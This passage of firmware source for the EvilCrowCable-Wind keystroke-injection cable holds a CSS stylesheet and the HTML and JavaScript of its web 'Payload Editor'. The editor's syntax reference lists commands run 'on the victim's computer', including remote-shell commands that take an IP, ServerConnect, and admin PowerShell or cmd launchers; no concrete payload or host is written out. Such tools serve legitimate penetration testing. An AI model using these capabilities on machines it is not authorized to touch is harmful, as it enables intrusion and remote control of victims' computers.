{\n  from { \n    opacity: 0;\n    transform: translateY(-30px);\n  }\n  to { \n    opacity: 1;\n    transform: translateY(0);\n  }\n}\n\n@keyframes toastFadeOut {\n  from { \n    opacity: 1;\n    transform: translateY(0);\n  }\n  to { \n    opacity: 0;\n    transform: translateY(-30px);\n  }\n}\n\n.toast-message.success {\n  border-top-color: var(--success); /* Changed from border-left */\n  color: var(--success);\n}\n\n.toast-message.error {\n  border-top-color: var(--error); /* Changed from border-left */\n  color: var(--error);\n}\n\n.toast-message.warning {\n  border-top-color: var(--warning); /* Changed from border-left */\n  color: var(--warning);\n}\n\n.toast-close {\n  cursor: pointer;\n  margin-left: 12px;\n  font-size: 1.1em;\n  color: inherit;\n}\n\n/* OS boxes for autoexec - Mobile optimized */\n.os-container {\n  display: flex;\n  flex-wrap: wrap;\n  justify-content: space-between;\n  margin: 15px 0;\n  gap: 12px;\n}\n\n.os-box {\n  flex: 1 1 150px;\n  min-height: 120px;\n  border: 2px dashed var(--primary);\n  border-radius: 5px;\n  padding: 12px;\n  background-color: rgba(51, 51, 51, 0.3);\n  text-align: center;\n  position: relative;\n  transition: all 0.3s;\n}\n\n.os-box.highlight {\n  border-color: var(--secondary);\n  background-color: rgba(0, 122, 255, 0.1);\n}\n\n.os-box h3 {\n  margin-top: 0;\n  color: var(--primary);\n  border-bottom: 1px solid var(--primary);\n  padding-bottom: 5px;\n  font-size: 16px;\n}\n\n.payload-preview {\n  background-color: rgba(0, 0, 0, 0.5);\n  border-radius: 5px;\n  padding: 8px;\n  margin: 8px 0;\n  word-break: break-word;\n  font-size: 13px;\n}\n\n.payload-item-os {\n  position: relative;\n  z-index: 1;\n  margin-bottom: 5px; /* Ensure spacing between items */\n}\n\n/* Command tables */\n.command-table {\n  width: 100%;\n  border-collapse: collapse;\n  margin: 15px 0;\n  font-size: 0.85em;\n  color: var(--light);\n}\n\n.command-table th, .command-table td {\n  padding: 6px 10px;\n  border: 1px solid var(--primary);\n  text-align: left;\n}\n\n.command-table th {\n  background-color: rgba(68, 68, 68, 0.5);\n  font-weight: bold;\n  color: var(--primary);\n}\n\n.command-table tr:nth-child(even) {\n  background-color: rgba(51, 51, 51, 0.3);\n}\n\n.command-table tr:hover {\n  background-color: rgba(85, 85, 85, 0.3);\n}\n\n.command-cell {\n  cursor: pointer;\n  transition: background-color 0.2s;\n}\n\n.command-cell:hover {\n  background-color: rgba(0, 122, 255, 0.2) !important;\n}\n\n/* Special cable wind elements */\n.cable-wind-logo {\n  text-align: center;\n  margin: 25px 0 15px 0; /* Increased top margin */\n  font-size: 2em;\n  text-transform: uppercase;\n  letter-spacing: 1px;\n  color: var(--primary);\n  text-shadow: 0 0 8px var(--primary);\n  position: relative;\n  z-index: 1;\n}\n\n.clickable-os {\n  cursor: pointer;\n  color: var(--primary);\n  text-decoration: underline;\n  transition: color 0.3s;\n}\n\n.clickable-os:hover {\n  color: var(--secondary);\n}\n\n/* Button containers */\n.button-container, .button-container-os {\n  display: flex;\n  flex-wrap: wrap;\n  justify-content: center;\n  gap: 8px;\n  margin: 15px 0;\n}\n\n.button-container button, \n.button-container-os button {\n  flex: auto;\n  min-width: 100px;\n  background: linear-gradient(135deg, var(--primary), var(--secondary));\n  color: var(--darker);\n  border: none;\n  padding: 10px 20px;\n  font-weight: bold;\n  border-radius: 3px;\n  cursor: pointer;\n  transition: all 0.3s;\n  min-width: 100px; /* Fixed minimum width */\n  width: 100px; /* Fixed width */\n  text-transform: uppercase;\n  letter-spacing: 1px;\n  position: relative;\n  overflow: hidden;\n  font-family: 'Courier New', monospace;\n  font-size: 14px;\n  margin: 5px;\n  min-height: 44px;\n  white-space: nowrap; /* Prevent text wrapping */\n  margin-left: auto; /* Push to the right */\n  flex-shrink: 0; /* Prevent shrinking */\n}\n\n.select-os-btn {\n    /* Make button wider to accommodate longer text */\n    width: 140px;\n    min-width: 140px;\n    max-width: 140px;\n    /* Visual styling */\n    background: linear-gradient(135deg, var(--primary), var(--secondary));\n    color: var(--darker);\n    border: none;\n    padding: 10px 8px;\n    font-weight: bold;\n    border-radius: 3px;\n    cursor: pointer;\n    transition: all 0.3s;\n    /* Text styling */\n    text-transform: uppercase;\n    letter-spacing: 1px;\n    font-family: 'Courier New', monospace;\n    font-size: 12px;\n    white-space: nowrap;\n    overflow: hidden;\n    text-overflow: ellipsis;\n    /* Positioning */\n    position: relative;\n    margin: 5px;\n    flex-shrink: 0;\n    display: inline-flex;\n    align-items: center;\n    justify-content: center;\n    margin-left: auto;\n}\n\n.button-container button:hover, \n.button-container-os button:hover,\n.select-os-btn:hover {\n  transform: translateY(-2px);\n  box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4);\n}\n\n\n.button-container button::after, \n.button-container-os button::after,\n.select-os-btn::after {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  left: -100%;\n  width: 100%;\n  height: 100%;\n  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);\n  transition: 0.5s;\n}\n\n.button-container button:hover::after, \n.button-container-os button:hover::after,\n.select-os-btn:hover::after {\n  left: 100%;\n}\n\n/* HR styling */\nhr {\n  border: none;\n  height: 1px;\n  background-color: var(--primary);\n  margin: 15px 0;\n}\n\n/* Stat containers */\n.stat-container {\n  display: flex;\n  flex-wrap: wrap;\n  justify-content: center;\n  gap: 12px;\n  margin: 15px 0;\n}\n\n.stat-group {\n  flex: 1 1 180px;\n  border: 1px solid var(--primary);\n  border-radius: 5px;\n  padding: 12px;\n  min-width: 0;\n  background-color: rgba(10, 10, 10, 0.9); /* Darker than before */\n}\n\n/* Form containers */\n.config-container {\n  background: rgba(51, 51, 51, 0.3);\n  border: 1px solid var(--primary);\n  border-radius: 5px;\n  padding: 15px;\n  margin: 15px auto;\n  max-width: 600px;\n}\n\n/* Config page specific buttons */\n.config-buttons-container {\n    display: flex;\n    justify-content: space-between;\n    margin: 15px 0;\n    width: 100%;\n}\n\n.config-buttons-container button {\n    width: 48%;\n    min-width: auto;\n    margin: 0;\n}\n\nbutton[name=\"clearCacheButton\"] {\n    background: linear-gradient(135deg, var(--error), #cc0022);\n}\n\nbutton[name=\"rebootDeviceButton\"] {\n    background: linear-gradient(135deg, var(--warning), #ff6600);\n}\n\n/* Metadata form */\n#metadataForm {\n  background: rgba(51, 51, 51, 0.5);\n  border: 1px solid var(--primary);\n  border-radius: 5px;\n  padding: 15px;\n  margin: 15px 0;\n  display: none;\n}\n\n/* Payload buttons */\na.pyaloadButton {\n  background: linear-gradient(135deg, var(--primary), var(--secondary));\n  color: var(--darker);\n  border: none;\n  padding: 10px 12px;\n  font-weight: bold;\n  border-radius: 3px;\n  display: block;\n  text-align: center;\n  text-decoration: none;\n  margin: 8px 0;\n  transition: all 0.3s;\n}\n\na.pyaloadButton:hover {\n  transform: translateY(-2px);\n  box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4);\n}\n\n/* Responsive design */\n/* Hide only the hamburger menu checkbox (not other inputs) */\n#responsive-menu {\n  position: absolute;\n  width: 1px;\n  height: 1px;\n  padding: 0;\n  margin: -1px;\n  overflow: hidden;\n  clip: rect(0, 0, 0, 0);\n  white-space: nowrap;\n  border: 0;\n}\n\n@media (min-width: 768px) {\n  /* Show regular menu on desktop */\n  #menu ul {\n    display: flex !important; /* Important to override the checked state */\n    flex-direction: row;\n    justify-content: center;\n    flex-wrap: wrap;\n  }\n\n  #menu li {\n    margin: 0 15px;\n  }\n  \n  /* Hide hamburger menu on desktop */\n  #responsive-menu,\n  #responsive-menu + label {\n    display: none !important;\n  }\n\n  /* Force menu to always be visible on desktop */\n  #menu ul {\n    display: flex !important;\n    flex-direction: row;\n  }\n\n  /* Hide hamburger menu on desktop */\n  #responsive-menu {\n    display: none !important;\n  }\n  \n  /* Adjust container sizes for desktop */\n  .view-container {\n    padding: 20px;\n    margin: 20px auto;\n  }\n  \n  .os-box {\n    flex: 1 1 200px;\n    min-height: 150px;\n  }\n  \n  .terminal-style, textarea.payload-input {\n    height: 23em;\n  }\n  \n  .cable-wind-logo {\n    font-size: 2.5em;\n  }\n}\n\n/* OS Selection Modal */\n.os-modal {\n    position: fixed;\n    top: 0;\n    left: 0;\n    width: 100%;\n    height: 100%;\n    background-color: rgba(0, 0, 0, 0.8);\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    z-index: 10000;\n}\n\n.os-modal-content {\n    background: var(--darker);\n    border: 2px solid var(--primary);\n    border-radius: 8px;\n    padding: 20px;\n    max-width: 90%;\n    width: 400px;\n    box-shadow: 0 0 20px rgba(0, 242, 255, 0.5);\n}\n\n.os-modal h3 {\n    color: var(--primary);\n    margin-top: 0;\n    text-align: center;\n}\n\n.os-options {\n    display: grid;\n    grid-template-columns: 1fr 1fr;\n    gap: 10px;\n    margin: 20px 0;\n}\n\n.os-options button {\n    background: linear-gradient(135deg, var(--primary), var(--secondary));\n    color: var(--darker);\n    border: none;\n    padding: 12px;\n    border-radius: 4px;\n    font-weight: bold;\n    cursor: pointer;\n    transition: all 0.3s;\n}\n\n.os-options button:hover {\n    transform: translateY(-2px);\n    box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4);\n}\n\n.close-modal {\n    background: var(--error) !important;\n    width: 100%;\n    margin-top: 10px;\n}\n\n.payload-header {\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n    margin-bottom: 8px;\n    gap: 10px;\n}\n\n.payload-header strong {\n    flex-grow: 1; /* Allow the text to take remaining space */\n    overflow: hidden;\n    text-overflow: ellipsis;\n    white-space: nowrap;\n}\n\n.select-os-btn:hover {\n    background: linear-gradient(135deg, #55616F, #73879F);\n}\n\n/* Add this to your style.css */\n.status-indicator {\n    display: inline-block;\n    width: 12px;\n    height: 12px;\n    border-radius: 50%;\n    margin-left: 8px;\n    vertical-align: middle;\n}\n\n.status-online {\n    background-color: var(--success);\n    box-shadow: 0 0 8px var(--success);\n}\n\n.status-offline {\n    background-color: var(--error);\n    box-shadow: 0 0 8px var(--error);\n}\n\n/* Page title indicators */\n.cable-wind-logo::after {\n    content: '';\n    display: inline-block;\n    width: 10px;\n    height: 10px;\n    border-radius: 50%;\n    margin-left: 12px;\n    vertical-align: middle;\n}\n\n.cable-wind-logo.online::after {\n    background-color: var(--success);\n    box-shadow: 0 0 6px var(--success);\n}\n\n.cable-wind-logo.offline::after {\n    background-color: var(--error);\n    box-shadow: 0 0 6px var(--error);\n}\n\n@media (max-width: 480px) {\n    .select-os-btn {\n      width: 100px;\n      min-width: 100px;\n      max-width: 100px;\n      padding: 6px 4px;\n      font-size: 11px;\n    }\n}\n\n.payload-list-container {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));\n  gap: 15px; /* Increased gap */\n  margin: 15px 0;\n  position: relative;\n  z-index: 1;\n}\n\n.button-container button, .button-container-os button {\n  width: 100%;\n}\n\n.stat-group {\n  flex: 1 1 100%;\n}\n\n#validationStatus {\n    font-size: 0.7em;  /* Reduced font size from 0.8em to 0.7em */\n    margin-left: 10px;\n    display: inline-block;\n    vertical-align: middle;\n}\n\n@media (max-width: 480px) {\n    #validationStatus {\n        font-size: 0.6em;  /* Even smaller on mobile */\n    }\n}\n\n.validation-ok {\n    color: var(--success);\n}\n\n.validation-error {\n    color: var(--error);\n}\n\n.payload-editor-container {\n    display: flex;\n    position: relative;\n    height: 20em;\n    background-color: rgba(10, 10, 10, 0.9);\n    border: 1px solid var(--primary);\n    border-radius: 3px;\n    overflow: hidden;\n}\n\n.payload-editor-container {\n    display: flex;\n    position: relative;\n    height: 20em;\n    background-color: rgba(10, 10, 10, 0.9);\n    border: 1px solid var(--primary);\n    border-radius: 3px;\n    overflow: hidden;\n}\n\n.line-numbers {\n    width: 30px;\n    padding: 12px 5px 12px 10px;\n    background-color: rgba(5, 5, 8, 0.7);\n    color: #666;\n    font-family: 'Courier New', monospace;\n    font-size: 0.8em;\n    text-align: right;\n    user-select: none;\n    overflow-y: scroll;\n    -ms-overflow-style: none;\n    scrollbar-width: none;\n    border: none;\n    line-height: 22px;\n    height: 100%;\n    box-sizing: border-box;\n}\n\n#livePayloadInput {\n    flex: 1;\n    border: none;\n    border-radius: 0 3px 3px 0;\n    padding: 12px;\n    background-color: transparent;\n    color: var(--secondary);\n    line-height: 22px;\n    resize: none;\n    white-space: pre;\n    overflow-x: auto;\n    overflow-y: auto;\n    height: 100%;\n    box-sizing: border-box;\n    font-family: 'Courier New', monospace;\n    font-size: 0.95em;\n}\n\n/* Mobile styles remain exactly the same */\n@media (max-width: 768px) {\n    .payload-editor-container {\n        height: 15em;\n    }\n    \n    .line-numbers, #livePayloadInput {\n        font-size: 14px;\n        line-height: 1.4em;\n    }\n    \n    .line-numbers {\n        width: 25px;\n        padding: 12px 3px 8px 5px;\n    }\n}\n\n.line-numbers::-webkit-scrollbar {\n    display: none;\n}\n\n.autocomplete-suggestion {\n    position: absolute;\n    color: var(--primary);\n    pointer-events: none;\n    font-family: 'Courier New', monospace;\n    background-color: rgba(0, 0, 0, 0.9);\n    padding: 2px 6px;\n    border-radius: 3px;\n    border: 1px solid var(--secondary);\n    box-shadow: 0 0 5px rgba(0, 242, 255, 0.5);\n    z-index: 1000;\n    white-space: pre;\n    font-weight: bold;\n}\n\n/* Command Reference Styles */\n.command-reference, .keys-reference {\n    background: rgba(10, 10, 18, 0.8);\n    border: 1px solid var(--primary);\n    border-radius: 5px;\n    margin: 20px 0;\n    overflow: hidden;\n}\n\n.command-reference-toggle, .keys-reference-toggle {\n    padding: 15px;\n    cursor: pointer;\n    background: rgba(0, 0, 0, 0.3);\n    color: var(--primary);\n    font-weight: bold;\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n}\n\n.command-reference-toggle:hover, .keys-reference-toggle:hover {\n    background: rgba(0, 242, 255, 0.1);\n}\n\n.command-table-container, .keys-table-container {\n    padding: 0 15px 15px;\n    max-height: 300px;\n    overflow-y: auto;\n}\n\n/* OS selector*/\n.styled-select {\n  background-color: rgba(10, 10, 10, 0.9); /* igual que tu .view-container */\n  border: 1px solid var(--primary);\n  color: var(--light);\n  padding: 8px 12px;\n  border-radius: 3px;\n  width: 100%;\n  font-family: 'Courier New', monospace;\n  font-size: 16px;\n  margin-bottom: 12px;\n  transition: all 0.3s;\n  box-sizing: border-box;\n\n  /* Eliminar apariencia nativa */\n  appearance: none;\n  -webkit-appearance: none;\n  -moz-appearance: none;\n\n  /* \ufffd\ufffdcono de flecha */\n  background-image: url(\"data:image/svg+xml,%3Csvg fill='%2300f2ff' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E\");\n  background-repeat: no-repeat;\n  background-position: right 12px center;\n  background-size: 16px 16px;\n  padding-right: 36px; /* Espacio para flecha */\n}\n\n.styled-select:focus {\n  outline: none;\n  border-color: var(--secondary);\n  box-shadow: 0 0 10px rgba(0, 255, 136, 0.3);\n}\n\n.section-header {\n  font-size: 1.2em;\n  color: var(--primary);\n  margin: 20px 0 10px 0;\n  padding-bottom: 5px;\n  border-bottom: none;\n  position: relative;\n  text-transform: uppercase;\n  letter-spacing: 1px;\n  font-weight: bold;\n}\n\n.section-header::after {\n  content: '';\n  position: absolute;\n  bottom: 0;\n  left: 0;\n  width: 100%;\n  height: 1px;\n  background: linear-gradient(90deg, transparent, var(--primary), transparent);\n}\n\n.page-loading::before {\n    content: \"\";\n    position: fixed;\n    top: 0;\n    left: 0;\n    width: 100%;\n    height: 100%;\n    background: rgba(5, 5, 8, 0.9);\n    z-index: 9999;\n}\n\n.page-loading::after {\n    content: \"LOADING...\";\n    position: fixed;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    color: var(--primary);\n    font-family: 'Courier New', monospace;\n    font-size: 1.2em;\n    font-weight: bold;\n    text-transform: uppercase;\n    letter-spacing: 2px;\n    text-shadow: 0 0 8px var(--primary);\n    z-index: 10000;\n    animation: pulse 1.5s infinite alternate;\n}\n\n@keyframes pulse {\n    from { opacity: 0.7; text-shadow: 0 0 5px var(--primary); }\n    to { opacity: 1; text-shadow: 0 0 15px var(--primary), 0 0 20px var(--secondary); }\n}\n)=====\";\n\nGroup: livepayload\nContent:\nconst char LivePayload[] PROGMEM = R\"=====(\n<!DOCTYPE HTML>\n<html>\n<head>\n    <title>EvilCrowCable-Wind - Payload Editor</title>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n    <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n    <meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\">\n    <link rel=\"stylesheet\" href=\"style.css\">\n    <script src=\"javascript.js\"></script>\n</head>\n<body>\n    <div id=\"global-toast\" class=\"toast-container\"></div>\n    <nav id='menu'>\n        <input type='checkbox' id='responsive-menu'><label for='responsive-menu'></label>\n        <ul>\n            <li><a href='/'>Home</a></li>\n            <li><a href='/livepayload'>Payload Editor</a></li>\n            <li><a href='/uploadpayload'>Upload Payload</a></li>\n            <li><a href='/listpayloads'>List Payloads</a></li>\n            <li><a href='/autoexecplanning'>AutoExec Planning</a></li>\n            <li><a href='/config'>Config</a></li>\n        </ul>\n    </nav>\n\n    <div class=\"cable-wind-logo\">PAYLOAD EDITOR</div>\n\n    <div class=\"view-container\">\n        <div class=\"form-group\">\n            <div class=\"validation-container\">\n                <span id=\"validationStatus\"></span>\n            </div>\n            <div class=\"payload-editor-container\">\n                <div id=\"lineNumbers\" class=\"line-numbers\"></div>\n                <textarea id=\"livePayloadInput\" class=\"terminal-style\" name=\"livepayload\" spellcheck=\"false\"></textarea>\n            </div>\n        </div>\n\n        <div class=\"button-container\">\n            <button type=\"button\" onclick=\"runPayload()\">Run Payload</button>\n            <button type=\"button\" onclick=\"showSavePayloadForm()\">Save Payload</button>\n        </div>\n\n        <!-- Hidden metadata form that appears when saving -->\n        <div id=\"metadataForm\" style=\"display: none;\">\n            <div class=\"form-group\">\n                <label for=\"payloadName\">Payload Name:</label>\n                <input type=\"text\" id=\"payloadName\" name=\"payloadName\" placeholder=\"Enter a descriptive name\" class=\"terminal-style\">\n            </div>\n            <div class=\"form-group\">\n                <label for=\"payloadDescription\">Description:</label>\n                <textarea id=\"payloadDescription\" name=\"payloadDescription\" placeholder=\"Enter a brief description\" rows=\"3\" class=\"terminal-style\"></textarea>\n            </div>\n            <div class=\"form-group\">\n                <label for=\"payloadOS\">Target OS:</label>\n                <select id=\"payloadOS\" class=\"styled-select\" name=\"payloadOS\" required>\n                  <option value=\"unknown\">Select OS</option>\n                  <option value=\"windows\">Windows</option>\n                  <option value=\"linux\">Linux</option>\n                  <option value=\"android\">Android</option>\n                  <option value=\"macos\">macOS</option>\n                  <option value=\"ios\">iOS</option>\n                </select>\n            </div>\n            <div class=\"button-container\">\n                <button type=\"button\" onclick=\"confirmSavePayload()\">Confirm Save</button>\n                <button type=\"button\" onclick=\"cancelSavePayload()\" style=\"background: linear-gradient(135deg, var(--error), #cc0022);\">Cancel</button>\n            </div>\n        </div>\n\n        <div class=\"command-reference\">\n            <div class=\"command-reference-toggle\" onclick=\"toggleSection(this)\">\n                <span>Syntax Reference</span>\n                <span>\ufffd\ufffd\ufffd</span>\n            </div>\n            <div class=\"command-table-container\" style=\"display: none;\">\n                <table class=\"command-table\">\n                    <thead>\n                        <tr>\n                            <th>Command</th>\n                            <th>Example</th>\n                            <th>Description</th>\n                        </tr>\n                    </thead>\n                    <tbody>\n                        <tr><td class=\"command-cell\"># Layout:</td><td># Layout: EN_US</td><td>Set keyboard layout for the payload. Must be the first line.</td></tr>\n                        <tr><td class=\"command-cell\">ServerConnect</td><td>ServerConnect IP</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">DetectOS</td><td>DetectOS</td><td>Detect the operating system</td></tr>\n                        <tr><td class=\"command-cell\">RunWin</td><td>RunWin cmd</td><td>Runs a command or a program on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">RunPowershellAdmin</td><td>RunPowershellAdmin</td><td>Run powershell as administrator</td></tr>\n                        <tr><td class=\"command-cell\">RunCmdAdmin</td><td>RunCmdAdmin</td><td>Run cmd as administrator</td></tr>\n                        <tr><td class=\"command-cell\">ShellWin</td><td>ShellWin IP</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">RunNix</td><td>RunNix getit</td><td>Runs a command or a program on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">RunLauncher</td><td>RunLauncher Libreoffice</td><td>Runs a command or a program on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">CtrlAltT</td><td>CtrlAltT</td><td>Run a terminal on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">ShellNix</td><td>ShellNix IP</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">ShellMac</td><td>ShellMac IP</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">ShellMacCleanup</td><td>ShellMacCleanup</td><td>Read the \"Remote Shell\" section for more information</td></tr>\n                        <tr><td class=\"command-cell\">RunMac</td><td>RunMac terminal</td><td>Runs a command or a program on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">GuiR</td><td>GuiR</td><td>Press WINDOWS+R on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">Gui</td><td>Gui</td><td>Press WINDOWS on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">AltF2</td><td>AltF2</td><td>Press ALT+F2 on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">GuiSpace</td><td>GuiSpace</td><td>Press WINDOWS+SPACE on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">Print</td><td>Print Hello World!</td><td>Prints a text on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">WinPrint</td><td>WinPrint Hello World!</td><td>Print a text on the victim's computer without knowing the layout (Windows only)</td></tr>\n                        <tr><td class=\"command-cell\">PrintLine</td><td>PrintLine Hello World!</td><td>Prints a text and presses the ENTER key on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">WinPrintLine</td><td>WinPrintLine Hello World!</td><td>Prints a text and presses the ENTER key on the victim's computer without knowing the layout (Windows only)</td></tr>\n                        <tr><td class=\"command-cell\">Delay</td><td>Delay 5000</td><td>Delay in ms</td></tr>\n                        <tr><td class=\"command-cell\">Press</td><td>Press KEY_ENTER</td><td>Press a key or modifier on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">PressRelease</td><td>PressRelease KEY_ENTER</td><td>Press and Release a key or modifier on the victim's computer</td></tr>\n                        <tr><td class=\"command-cell\">Release</td><td>Release</td><td>Release all pressed keys</td></tr>\n                    </tbody>\n                </table>\n            </div>\n        </div>\n\n        <div class=\"keys-reference\">\n            <div class=\"keys-reference-toggle\" onclick=\"toggleSection(this)\">\n                <span>Keys and Modifiers Syntax</span>\n                <span>\ufffd\ufffd\ufffd</span>\n            </div>\n            <div class=\"keys-table-container\" style=\"display: none;\">\n                <table class=\"command-table\">\n                    <thead>\n                        <tr>\n                            <th>Keys and Modifiers - Press</th>\n                            <th>Keys - PressRelease</th>\n                        </tr>\n                    </thead>\n                    <tbody>\n                        <tr><td>a - Z, 0 - 9, Special characters</td><td>Example: Press a or PressRelease a</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_ALT</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_GUI</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_CTRL</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_SHIFT</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_ALT</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_GUI</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_CTRL</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_SHIFT</td><td>Only press available for modifiers</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_ENTER</td><td class=\"command-cell\">PressRelease KEY_ENTER</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_UP_ARROW</td><td class=\"command-cell\">PressRelease KEY_UP_ARROW</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_DOWN_ARROW</td><td class=\"command-cell\">PressRelease KEY_DOWN_ARROW</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_LEFT_ARROW</td><td class=\"command-cell\">PressRelease KEY_LEFT_ARROW</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_RIGHT_ARROW</td><td class=\"command-cell\">PressRelease KEY_RIGHT_ARROW</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_BACKSPACE</td><td class=\"command-cell\">PressRelease KEY_BACKSPACE</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_TAB</td><td class=\"command-cell\">PressRelease KEY_TAB</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_PAUSE</td><td class=\"command-cell\">PressRelease KEY_PAUSE</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_INSERT</td><td class=\"command-cell\">PressRelease KEY_INSERT</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_DELETE</td><td class=\"command-cell\">PressRelease KEY_DELETE</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_PAGE_UP</td><td class=\"command-cell\">PressRelease KEY_PAGE_UP</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_PAGE_DOWN</td><td class=\"command-cell\">PressRelease KEY_PAGE_DOWN</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_ESC</td><td class=\"command-cell\">PressRelease KEY_ESC</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_SPACE</td><td class=\"command-cell\">PressRelease KEY_SPACE</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_HOME</td><td class=\"command-cell\">PressRelease KEY_HOME</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_END</td><td class=\"command-cell\">PressRelease KEY_END</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_CAPS_LOCK</td><td class=\"command-cell\">PressRelease KEY_CAPS_LOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_PRINT_SCREEN</td><td class=\"command-cell\">PressRelease KEY_PRINT_SCREEN</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_SCROLL_LOCK</td><td class=\"command-cell\">PressRelease KEY_SCROLL_LOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_NUM_LOCK</td><td class=\"command-cell\">PressRelease KEY_NUM_LOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_MENU</td><td class=\"command-cell\">PressRelease KEY_MENU</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_NUMLOCK</td><td class=\"command-cell\">PressRelease LED_NUMLOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_CAPSLOCK</td><td class=\"command-cell\">PressRelease LED_CAPSLOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_SCROLLLOCK</td><td class=\"command-cell\">PressRelease LED_SCROLLLOCK</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_COMPOSE</td><td class=\"command-cell\">PressRelease LED_COMPOSE</td></tr>\n                        <tr><td class=\"command-cell\">Press LED_KANA</td><td class=\"command-cell\">PressRelease LED_KANA</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F1</td><td class=\"command-cell\">PressRelease KEY_F1</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F2</td><td class=\"command-cell\">PressRelease KEY_F2</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F3</td><td class=\"command-cell\">PressRelease KEY_F3</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F4</td><td class=\"command-cell\">PressRelease KEY_F4</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F5</td><td class=\"command-cell\">PressRelease KEY_F5</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F6</td><td class=\"command-cell\">PressRelease KEY_F6</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F7</td><td class=\"command-cell\">PressRelease KEY_F7</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F8</td><td class=\"command-cell\">PressRelease KEY_F8</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F9</td><td class=\"command-cell\">PressRelease KEY_F9</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F10</td><td class=\"command-cell\">PressRelease KEY_F10</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F11</td><td class=\"command-cell\">PressRelease KEY_F11</td></tr>\n                        <tr><td class=\"command-cell\">Press KEY_F12</td><td class=\"command-cell\">PressRelease KEY_F12</td></tr>\n                    </tbody>\n                </table>\n            </div>\n        </div>\n    </div>\n\n    <script>\n        // Global variables for autocomplete\n        let commandSuggestions = {};\n        let currentSuggestion = null;\n        let suggestionElement = null;\n        \n        // Global commands list\n        const commands = [\n            // Special configuration commands\n            '# Layout:',  // Special command for keyboard layout configuration\n            // Main commands\n            'ServerConnect',\n            'DetectOS',\n            'RunWin',\n            'RunPowershellAdmin',\n            'RunCmdAdmin',\n            'ShellWin',\n            'RunNix',\n            'RunLauncher',\n            'CtrlAltT',\n            'ShellNix',\n            'ShellMac',\n            'ShellMacCleanup',\n            'RunMac',\n            'GuiR',\n            'Gui',\n            'AltF2',\n            'GuiSpace',\n            